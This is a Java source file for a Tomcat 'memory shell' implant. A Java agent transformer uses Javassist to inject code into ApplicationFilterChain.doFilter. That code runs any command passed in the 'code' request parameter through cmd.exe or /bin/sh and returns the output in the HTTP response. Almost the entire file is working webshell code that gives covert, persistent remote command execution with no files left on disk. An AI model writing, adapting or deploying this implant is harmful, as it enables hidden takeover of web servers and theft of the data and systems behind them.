import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class TransformerFilterMemshell implements ClassFileTransformer {
    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println("start inject");
        if (!className.equals(editClassName2)) return null;
        try {
            ClassPool cp = ClassPool.getDefault();
            cp.appendClassPath(new LoaderClassPath(loader));

            CtClass ctc = cp.get(editClassName);
            CtMethod method = ctc.getDeclaredMethod(editMethod);
            String source = "javax.servlet.http.HttpServletRequest req = request;\n" +
                    "javax.servlet.http.HttpServletResponse res = response;\n" +
                    "String arg0 = req.getParameter(\"code\");\n" +
                    "java.io.PrintWriter writer = res.getWriter();\n" +
                    "\n" +
                    "if (arg0 != null) {\n" +
                    "    String o = \"\";\n" +
                    "    java.lang.ProcessBuilder p;\n" +
                    "\n" +
                    "    if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
                    "        p = new java.lang.ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
                    "    } else {\n" +
                    "        p = new java.lang.ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
                    "    }\n" +
                    "\n" +
                    "    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
                    "    o = c.hasNext() ? c.next() : o;\n" +
                    "    c.close();\n" +
                    "\n" +
                    "    writer.write(o);\n" +
                    "    writer.flush();\n" +
                    "    writer.close();\n" +
                    "}";
            method.insertBefore(source);

            byte[] bytes = ctc.toBytecode();
            ctc.detach();
            System.out.println("inject success");
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
